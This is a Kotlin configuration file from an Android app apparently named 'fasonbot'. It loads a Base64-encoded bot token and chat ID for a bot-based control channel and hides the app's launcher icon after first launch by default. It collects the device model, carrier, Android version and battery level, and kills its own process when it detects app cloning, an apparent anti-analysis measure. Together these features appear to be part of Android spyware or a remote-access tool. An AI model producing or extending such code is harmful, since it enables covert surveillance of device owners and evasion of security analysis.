package com.fasonbot.app.config

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import com.google.gson.Gson
import java.util.*

object BotConfig {

    // Base64 encoded config: echo -n '{"botToken":"TOKEN","chatId":"ID","autoHideIcon":true}' | base64
    private const val CONFIG_DATA = ""

    private data class Config(
        val botToken: String = "",
        val chatId: String = "",
        val autoHideIcon: Boolean = true  // Default: auto-hide enabled
    )

    private val gson = Gson()

    fun getBotToken(): String = loadConfig().botToken

    fun getChatId(): String = loadConfig().chatId

    /**
     * Returns whether the app icon should be automatically hidden after first launch.
     * Default is true (auto-hide enabled).
     * Set to false to keep the icon visible in launcher.
     */
    fun shouldAutoHideIcon(): Boolean = loadConfig().autoHideIcon

    private fun loadConfig(): Config {
        if (CONFIG_DATA.isEmpty()) return Config()
        return try {
            val json = Base64.getDecoder().decode(CONFIG_DATA).toString(Charsets.UTF_8)
            gson.fromJson(json, Config::class.java) ?: Config()
        } catch (_: Exception) {
            Config()
        }
    }

    fun getAndroidVersion(): Int = Build.VERSION.SDK_INT

    fun getAndroidVersionName(): String = when (Build.VERSION.SDK_INT) {
        28 -> "9.0 Pie"
        29 -> "10"
        30 -> "11"
        31 -> "12"
        32 -> "12L"
        33 -> "13"
        34 -> "14"
        35 -> "15"
        else -> "Android ${Build.VERSION.RELEASE}"
    }

    fun getProviderName(context: Context): String = try {
        val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        manager.networkOperatorName ?: "Unknown"
    } catch (_: Exception) {
        "Unknown"
    }

    fun getDeviceName(): String {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val locale = Locale.getDefault()
        return if (model.lowercase(locale).startsWith(manufacturer.lowercase(locale))) {
            model.replaceFirstChar { it.uppercase() }
        } else {
            "${manufacturer.replaceFirstChar { it.uppercase() }} $model"
        }
    }

    fun getBatteryPercentage(context: Context): Int = try {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    } catch (_: Exception) {
        0
    }

    fun isConfigValid(): Boolean {
        val config = loadConfig()
        return config.botToken.isNotEmpty() && config.chatId.isNotEmpty()
    }

    fun checkAppCloning(activity: android.app.Activity) {
        try {
            val path = activity.filesDir.path
            if (path.contains("999") || path.count { it == '.' } > 2) {
                activity.finish()
                android.os.Process.killProcess(android.os.Process.myPid())
            }
        } catch (_: Exception) {}
    }
}
